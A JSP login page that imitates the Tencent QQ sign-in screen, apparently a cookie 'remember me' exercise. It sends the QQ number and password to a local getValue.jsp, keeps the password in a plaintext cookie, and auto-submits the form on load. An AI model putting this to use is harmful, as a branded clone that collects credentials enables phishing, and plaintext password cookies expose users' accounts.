<%@ page language="java" import="java.util.*" pageEncoding="utf-8" %>
<%@ page import="java.net.URLDecoder" %>
<%
    String path = request.getContextPath();
    String basePath = request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort() + path + "/";
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <base href="<%=basePath%>">
    <title></title>
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
    <meta http-equiv="description" content="This is my page">
    <link type="text/css" rel="stylesheet" href="css/QQcss.css"/>
    <script type="text/javascript">
        onload = function (ev) {
            var username = document.getElementById("u").value;
            var password = document.getElementById("p").value;
            if (username != null && username != "" && password != null && password != "") {
                document.getElementById("go").click();
            }
        }
    </script>
</head>
<body>
<%
    //拿出用户名密码
    String cName = "";
    String cPwd = "";
    Cookie[] cs = request.getCookies();
    if (cs != null) {
        for (Cookie c : cs) {
            if ("cName".equals(c.getName())) {
                cName = URLDecoder.decode(c.getValue(), "utf-8");
            }
            if ("cPwd".equals(c.getName())) {
                cPwd = c.getValue();
            }
        }
    }
%>
<div id="logo" class="logo"></div>
<form id="tijiao" action="getValue.jsp" method="post">
    <div id="q_logon_list" class="q_logon_list"></div>
    <div id="web_login">
        <ul id="g_list">
            <li id="g_u">
                <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
                <input id="u" class="inputstyle" name="name" autocomplete="off" placeholder="QQ号码/手机/邮箱"
                       value="<%=cName%>"></li>
            <li id="g_p">
                <div id="del_touch_p" class="del_touch"><span id="del_p" class="del_u"></span></div>
                <input id="p" class="inputstyle" maxlength="16" type="password" name="pwd" autocorrect="off"
                       value="<%=cPwd%>"
                       placeholder="请输入您的QQ密码"></li>
        </ul>
        <button id="go" name="submit">登&nbsp;&nbsp;录</button>
        <div href="javascript:void(0);" id="onekey">一键登录</div>
    </div>
    <div id="switch">
        <div id="swicth_login" onclick="pt._switch()" style="display:none">快速登录历史帐号</div>
        <div id="zc_feedback"><span id="zc" onclick="window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')">注册新帐号</span>
            <span id="forgetpwd"
                  onclick="window.open('https://aq.qq.com/v2/uv_aq/html/reset_pwd/pc_reset_pwd_input_account.html?v=3.0&old_ver_account=')">忘了密码？</span>
        </div>
    </div>
    <div id="cook"><input type="checkbox" name="isno" value="yes">&nbsp;免登陆10天</div>

</form>
</body>
</html>
